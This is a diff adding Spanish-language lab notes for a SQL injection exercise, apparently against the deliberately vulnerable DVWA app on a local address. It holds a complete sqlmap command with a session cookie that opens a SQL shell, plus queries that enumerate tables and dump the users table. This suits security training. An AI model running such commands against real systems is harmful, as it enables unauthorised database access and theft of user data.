@@ -76,6 +76,25 @@
 --- Abrir wireshark para comprobar 
 
 
+++ Ejercicio_9 (SQL Shell)
+--- sqlmap -u 'http://127.8.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#' --
+cookie='PHPSESSID=qhj2pmck3k9gnmbn5ahvg80ok7; security=low' --sql-shell -
+-batch
+--- Comandos de ejemplo:
+---- database() ---> Muestra la información referente a la base de datos
+---- SELECT table_name FROM information_schema.tables WHERE
+table_schema = 'dvwa';
+---- SELECT * FROM dvwa.users;
+---- SELECT * FROM dvwa.guestbook;
+---- SELECT COUNT(*) FROM dvwa.users;
+---- SELECT * FROM dvwa.users LIMIT 5;
+---- SELECT COUNT(*), first_name FROM dvwa.users GROUP BY
+first_name;
+---- SELECT column_name, data_type FROM information_schema.columns
+WHERE table_name = 'users';
+
+
+
 
 
 
